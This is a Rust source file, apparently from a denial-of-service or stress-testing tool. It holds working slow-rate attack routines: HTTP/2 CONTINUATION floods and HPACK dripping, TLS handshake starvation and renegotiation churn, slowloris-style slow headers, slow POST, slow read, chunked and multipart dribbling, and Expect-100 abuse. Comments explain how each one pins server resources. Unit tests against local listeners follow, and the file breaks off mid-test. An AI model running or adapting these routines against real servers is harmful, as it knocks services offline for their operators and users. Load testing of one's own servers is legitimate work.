    let mut streams: Vec<u32> = Vec::new();
    for _ in 0..32 {
        let sid = 1 + 2 * streams.len() as u32;
        let path = request_path(config, rng);
        let block = h2::request_block(
            "POST",
            &path,
            &authority,
            "http",
            &[("content-type", "application/octet-stream")],
        );
        if write_full(
            stream,
            &h2::frame(sid, h2::HEADERS, h2::END_HEADERS, &block),
            stats,
        )
        .is_err()
        {
            return false;
        }
        streams.push(sid);
    }
    while !should_stop(running) {
        for &sid in &streams {
            let byte = [dribble(rng)];
            if write_full(stream, &h2::data(sid, &byte, false), stats).is_err() {
                break;
            }
            drain_responses(stream, stats);
            if should_stop(running) {
                break;
            }
        }
        halt(rng, config, running);
    }
    !should_stop(running)
}

#[allow(clippy::manual_is_multiple_of)] // keep `% N == 0` for rustc-1.75 build compat
fn h2_continuation_flood(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Flood the frame-reassembly layer: start a header block with a HEADERS
    // frame whose END_HEADERS is clear, then keep the block open with an
    // unbounded run of CONTINUATION frames (which RFC 7540 requires to
    // immediately follow, so nothing else can be interleaved). The block is
    // never completed, so the server buffers ever-growing reassembled header
    // state while counting an ever-growing number of frames.
    if write_full(stream, &h2_preamble(), stats).is_err() {
        return false;
    }
    let sid: u32 = 1;
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let first = h2::header_field(":method", &method);
    if write_full(stream, &h2::frame(sid, h2::HEADERS, 0, &first), stats).is_err() {
        return false;
    }
    let token = rng.alnum(8);
    let frag = h2::header_field("x-flood", &token);
    let mut n: usize = 0;
    while !should_stop(running) {
        let mut chunk: Vec<u8> = Vec::new();
        for _ in 0..256 {
            chunk.extend_from_slice(&h2::continuation(sid, &frag, false));
            n += 1;
        }
        if write_full(stream, &chunk, stats).is_err() {
            break;
        }
        drain_responses(stream, stats);
        if n % 2048 == 0 {
            halt(rng, config, running);
        }
    }
    !should_stop(running)
}

fn h2_hpack_drip(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // The HTTP/2 analogue of slowloris, done at the framing/HPACK layer: build
    // one valid request header block, then feed it a single octet per frame -
    // one byte in HEADERS, then one byte per CONTINUATION - with a random delay
    // between, setting END_HEADERS only on the final byte. A stalled drip
    // leaves an incomplete header block pinned; a completed one (POST, no
    // END_STREAM) leaves the stream waiting for a body.
    if write_full(stream, &h2_preamble(), stats).is_err() {
        return false;
    }
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let path = request_path(config, rng);
    let ua = *rng.choice(USER_AGENTS);
    let accept = *rng.choice(ACCEPTS);
    let block = h2::request_block(
        &method,
        &path,
        &config.header_host,
        "http",
        &[("user-agent", ua), ("accept", accept)],
    );
    let sid: u32 = 1;
    if write_full(stream, &h2::frame(sid, h2::HEADERS, 0, &block[..1]), stats).is_err() {
        return false;
    }
    let rest = &block[1..];
    for (i, &byte) in rest.iter().enumerate() {
        if should_stop(running) {
            return false;
        }
        let last = i == rest.len() - 1;
        if write_full(stream, &h2::continuation(sid, &[byte], last), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }
    // Block complete but no body/END_STREAM; hold the stream open.
    while !should_stop(running) {
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn tls_slow_hello(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // TLS handshake starvation (the TLS-layer analogue of slowloris): announce
    // a handshake *record* whose declared length far exceeds the bytes we ever
    // deliver, open a ClientHello inside it, then dribble a few body bytes at a
    // random delay and never complete the record. The server sizes its handshake
    // reassembly buffer from the record length and blocks in that read, pinning
    // a handshake worker/connection slot at near-zero bandwidth. TLS bytes are
    // hand-built in tls.rs (no crates); the socket is left raw (an
    // `http://host:port` target reaching the TLS listener directly).
    let random = rng.random_bytes(32);
    let announce = tls::starved_client_hello(&random, tls::MAX_RECORD, 8);
    announce_then_dribble(stream, stats, config, running, rng, &announce, 32);
    // Record never completed; hold the socket so the pinned buffer stays live.
    while !should_stop(running) {
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn tls_renego_hold(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // (Re)handshake-initiation churn: a fresh ClientHello is what a client sends
    // to start (or renegotiate) a TLS session, forcing the server to allocate
    // handshake state and, on completion, run expensive asymmetric crypto. Here
    // we repeatedly emit a new starved ClientHello record - each a fresh
    // handshake initiation - dribbling a byte and never completing any one, so
    // the server re-enters its handshake state machine and pins
    // renegotiation/handshake buffers over and over on a single connection.
    while !should_stop(running) {
        let random = rng.random_bytes(32);
        let announce = tls::starved_client_hello(&random, 2048, 6);
        if write_full(stream, &announce, stats).is_err() {
            break;
        }
        for _ in 0..8 {
            if should_stop(running) {
                return false;
            }
            if write_full(stream, &[dribble(rng)], stats).is_err() {
                return false;
            }
            halt(rng, config, running);
        }
        drain_responses(stream, stats);
    }
    !should_stop(running)
}

fn multipart_boundary(rng: &mut Rng) -> String {
    rng.alnum(24)
}

/// Names the caller explicitly programmed via `--header` (case-insensitive).
fn custom_header_names(config: &EngineConfig) -> Vec<String> {
    config
        .custom_headers
        .iter()
        .map(|(name, _)| name.to_ascii_lowercase())
        .collect()
}

fn multipart_slow_upload(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Multipart uploads exercise a different parser/handling path than the
    // opaque bodies sent by slow-post/chunked (boundary scanning, part
    // buffering, temp-file handling on real upload endpoints). Emit the
    // headers line by line, then dribble MIME-part content forever,
    // withholding the closing boundary so the upload never completes.
    let boundary = multipart_boundary(rng);
    let sep = format!("------WebKitFormBoundary{boundary}");
    let ctype = format!("multipart/form-data; boundary={sep}");

    let mut lines = vec![format!(
        "{} {} HTTP/1.1",
        config.method.clone().unwrap_or_else(|| "POST".to_string()),
        request_path(config, rng)
    )];
    // `--header Expect:...` must not leak into multipart: it would turn the
    // upload into an expect/continue transaction, and this profile is the
    // multipart one. A custom body is dribbled as-is below; Content-Length
    // is always the multipart byte budget either way.
    let custom = custom_header_names(config);
    for line in base_headers(config, rng) {
        let existing = line.split(':').next().unwrap_or("").trim();
        if existing.eq_ignore_ascii_case("expect") && !custom.contains(&"expect".to_string()) {
            continue;
        }
        lines.push(line);
    }
    lines.push(format!("Content-Type: {ctype}"));
    lines.push(format!("Content-Length: {}", config.base_post_length));
    for line in lines {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{line}\r\n").as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }
    if should_stop(running) {
        return false;
    }
    if write_full(stream, b"\r\n", stats).is_err() {
        return false;
    }
    if should_stop(running) {
        return false;
    }

    // A realistic file-upload preamble, then endless slow part content
    // with only non-closing boundaries so the body never terminates.
    let filename = rng.alnum(10);
    let prelude = format!(
        "{sep}\r\n\
         Content-Disposition: form-data; name=\"upload\"; filename=\"{filename}.bin\"\r\n\
         Content-Type: application/octet-stream\r\n\
         \r\n"
    );
    if write_full(stream, prelude.as_bytes(), stats).is_err() {
        return false;
    }
    let mut part = 0usize;
    // Countdown to the next non-final boundary instead of `part % 64 == 0`:
    // equivalent behaviour (fires at 64, 128, ...) while staying clean under
    // both the pinned clippy (rust 1.75) and modern `manual_is_multiple_of`.
    let mut since_boundary: usize = 64;
    while !should_stop(running) {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        part += 1;
        since_boundary -= 1;
        if since_boundary == 0 {
            since_boundary = 64;
            // Emit a fresh non-final boundary every so often: it keeps
            // multipart parsers scanning and buffering without ever
            // signalling the end of the upload.
            let chunk = format!(
                "\r\n{sep}\r\nContent-Disposition: form-data; name=\"field{part}\"\r\n\r\n"
            );
            if write_full(stream, chunk.as_bytes(), stats).is_err() {
                break;
            }
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn expect_continue_abuse(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Announce a body with `Expect: 100-continue`, consume the interim
    // response if the server sends one, then stall the body itself. Any
    // state the server allocated on its `100 Continue` decision (worker,
    // upload buffer) stays pinned while the connection is held open.
    let length = rng.range_usize(
        (config.base_post_length / 2).max(1),
        config.base_post_length,
    );

    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    // A caller-supplied `Expect:` (via --header, already merged by
    // base_headers) wins over the default: no duplicate lines either way.
    if !custom_header_names(config).contains(&"expect".to_string()) {
        headers.push("Expect: 100-continue".to_string());
    }
    let request = format!(
        "{method} {} HTTP/1.1\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    // Give the server a beat to answer with `100 Continue` (or a final
    // rejection); consume whatever arrived without blocking past the
    // configured read deadline, then keep the promised body stalled.
    //
    // NOTE: the interim read runs on its own deadline and never persists it
    // onto the stream: the attack path below relies on blocking writes, and
    // a stale read timeout would put every subsequent body byte on that
    // same short clock.
    let timeout = Duration::from_secs_f64(config.connect_timeout.max(0.5));
    let _ = stream.set_read_timeout(Some(timeout));
    let mut interim = [0u8; 1024];
    match stream.read(&mut interim) {
        Ok(0) => return false, // server closed the connection outright
        Ok(n) => stats.add_received(n as u64),
        Err(ref err)
            if err.kind() == io::ErrorKind::WouldBlock || err.kind() == io::ErrorKind::TimedOut => {
        }
        Err(_) => return false,
    }
    let _ = stream.set_read_timeout(None);
    if should_stop(running) {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    // Even after the announced byte count is exhausted, hold the socket
    // open instead of closing it.
    while !should_stop(running) {
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_post(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = match &config.custom_body {
        Some(body) => body.len(),
        None => rng.range_usize(
            (config.base_post_length / 2).max(1),
            config.base_post_length,
        ),
    };
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let request = format!(
        "{method} {} HTTP/1.1\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        let byte = match &config.custom_body {
            Some(body) => body[sent],
            None => dribble(rng),
        };
        if write_full(stream, &[byte], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_post_headers(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = rng.range_usize(
        (config.base_post_length / 2).max(1),
        config.base_post_length,
    );
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut lines = vec![format!("{method} {} HTTP/1.1", request_path(config, rng))];
    lines.extend(headers);

    let mut index = 0usize;
    while index < lines.len() && !should_stop(running) {
        if write_full(stream, format!("{}\r\n", lines[index]).as_bytes(), stats).is_err() {
            return !should_stop(running);
        }
        index += 1;
        halt(rng, config, running);
    }
    if !should_stop(running) {
        let _ = write_full(stream, b"\r\n", stats);
    }
    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_headers(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let request = format!("{method} {} HTTP/1.1\r\n", request_path(config, rng));
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    for (name, value) in &config.custom_headers {
        if write_full(stream, format!("{name}: {value}\r\n").as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
        if should_stop(running) {
            break;
        }
    }
    while !should_stop(running) {
        let key = format!("X-{}", rng.hex(6));
        let value = rng.hex(8);
        if write_full(stream, format!("{key}: {value}\r\n").as_bytes(), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }
    !should_stop(running)
}
fn slow_read(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let headers = base_headers(config, rng);
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let request = format!(
        "{method} {} HTTP/1.1\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    let timeout = Duration::from_secs_f64((config.connect_timeout * 2.0).max(1.0));
    let _ = stream.set_read_timeout(Some(timeout));

    let mut buffer = [0u8; 8];
    loop {
        if should_stop(running) {
            break;
        }
        match stream.read(&mut buffer) {
            Ok(0) => break, // server closed the connection
            Ok(n) => {
                stats.add_received(n as u64);
                halt(rng, config, running);
            }
            Err(ref err)
                if err.kind() == io::ErrorKind::WouldBlock
                    || err.kind() == io::ErrorKind::TimedOut =>
            {
                continue;
            }
            Err(_) => break,
        }
    }
    !should_stop(running)
}

fn chunked(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = match &config.custom_body {
        Some(body) => body.len(),
        None => rng.range_usize(
            (config.base_post_length / 2).max(1),
            config.base_post_length,
        ),
    };
    let mut headers = base_headers(config, rng);
    headers.push("Transfer-Encoding: chunked".to_string());
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let request = format!(
        "{method} {} HTTP/1.1\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        let size = rng.range_usize(1, 4).min(length - sent);
        let payload: Vec<u8> = match &config.custom_body {
            Some(body) => body[sent..sent + size].to_vec(),
            None => (0..size).map(|_| dribble(rng)).collect(),
        };
        let mut frame = format!("{size:x}\r\n").into_bytes();
        frame.extend_from_slice(&payload);
        frame.extend_from_slice(b"\r\n");
        if write_full(stream, &frame, stats).is_err() {
            break;
        }
        sent += size;
        halt(rng, config, running);
    }
    !should_stop(running)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    fn config(mode: &str) -> EngineConfig {
        EngineConfig {
            host: "127.0.0.1".into(),
            port: 9,
            path: "/".into(),
            header_host: "127.0.0.1".into(),
            secure: false,
            mode: mode.into(),
            concurrency: 1,
            duration: 0.0,
            delay_min: 0.0,
            delay_max: 0.001,
            connect_timeout: 3.0,
            base_post_length: 8,
            randomize_path: false,
            method: None,
            custom_headers: vec![("X-Custom".to_string(), "ok".to_string())],
            custom_body: None,
            json: false,
            stats_interval: 1.0,
            quiet: true,
            verbose: false,
            max_errors: 0,
            fail_under: 0,
            fail_on_zero: false,
        }
    }

    #[test]
    fn slow_post_sends_headers_then_drips_full_body() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_secs(3)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            loop {
                match sock.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= 512 {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("slow-post");
        let mut rng = Rng::new(1);
        let stats = Stats::new();
        let running = AtomicBool::new(true);
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();

        assert!(completed, "slow-post should complete on stop=true");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(
            text.starts_with("POST / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        assert!(text.contains("Content-Length: 8"), "missing length: {text}");
        assert!(
            text.contains("X-Custom: ok"),
            "missing custom header: {text}"
        );

        let header_end = text.find("\r\n\r\n").expect("header terminator") + 4;
        assert_eq!(
            received.len() - header_end,
            8,
            "expected exactly 8 dripped body bytes"
        );
    }

    #[test]
    fn slow_headers_never_terminates_request() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("slow-headers");
        let mut rng = Rng::new(2);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        // The profile only exits when the stop flag fires; flip it after a
        // short window from another thread so this test cannot deadlock.
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(50));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        // With `running=true` this profile never terminates, so after a short
        // window we interrupt via shutdown and it reports `false`.
        assert!(!completed, "interrupted profile must not report completion");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(
            text.starts_with("GET / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        assert!(!text.contains("\r\n\r\n"), "headers must never terminate");
        assert!(text.contains("X-Custom: ok"));
    }

    #[test]
    fn websocket_slow_upgrade_sends_websocket_headers() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("websocket-slow-upgrade");
        let mut rng = Rng::new(3);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(50));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        assert!(!completed, "interrupted profile must not report completion");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(
            text.starts_with("GET / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        assert!(
            text.contains("Upgrade: websocket"),
            "missing WebSocket upgrade header"
        );
        assert!(
            text.contains("Connection: Upgrade"),
            "missing Connection header"
        );
        assert!(text.contains("Sec-WebSocket-Key:"), "missing WebSocket key");
        assert!(
            text.contains("Sec-WebSocket-Version: 13"),
            "missing WebSocket version"
        );
    }

    #[test]
    fn http_pipelining_sends_multiple_requests() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("http-pipelining");
        let mut rng = Rng::new(4);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20)); // Shorter delay to ensure interruption
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        // http-pipelining may complete before interruption if it's fast enough
        // Just verify it sends multiple requests
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(
            text.starts_with("GET / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        // Count how many times "GET /" appears (each request starts with this)
        let request_count = text.matches("GET /").count();
        assert!(
            request_count > 1,
            "expected multiple requests, got {request_count}"
        );
    }

    #[test]
    fn range_abuse_sends_range_headers() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("range-abuse");
        let mut rng = Rng::new(5);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(
            text.starts_with("GET / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        // Count how many times "Range:" appears (each request has a Range header)
        let range_count = text.matches("Range:").count();
        assert!(
            range_count > 1,
            "expected multiple Range headers, got {range_count}"
        );
        // Verify Range header format
        assert!(
            text.contains("Range: bytes="),
            "Range header format incorrect"
        );
    }

    #[test]
    fn cookie_bomb_sends_large_cookie() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("cookie-bomb");
        let mut rng = Rng::new(6);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(
            text.starts_with("GET / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        // Verify Cookie header exists and is large
        assert!(text.contains("Cookie:"), "Cookie header missing");
        // Verify bomb_cookie name
        assert!(text.contains("bomb_cookie="), "Cookie name incorrect");
    }

    #[test]
    fn jsonrpc_slow_sends_json_content() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("jsonrpc-slow");
        let mut rng = Rng::new(7);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(
            text.starts_with("POST / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        // Verify JSON content type and payload
        assert!(
            text.contains("Content-Type: application/json"),
            "JSON content type missing"
        );
        assert!(
            text.contains(r#""jsonrpc":"2.0""#),
            "JSON-RPC version missing"
        );
        // Just check that JSON-RPC structure started (may be partial due to slow drip)
        assert!(
            text.contains(r#"{"jsonrpc""#) || text.contains(r#""method""#),
            "JSON-RPC structure missing"
        );
    }

    #[test]
    fn smtp_slow_envelope_sends_smtp_commands() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("smtp-slow-envelope");
        let mut rng = Rng::new(8);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // Verify SMTP commands were sent
        assert!(text.contains("EHLO"), "EHLO command missing");
        assert!(text.contains("MAIL FROM:"), "MAIL FROM command missing");
        assert!(text.contains("RCPT TO:"), "RCPT TO command missing");
    }

    #[test]
    fn ftp_slow_command_sends_ftp_commands() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
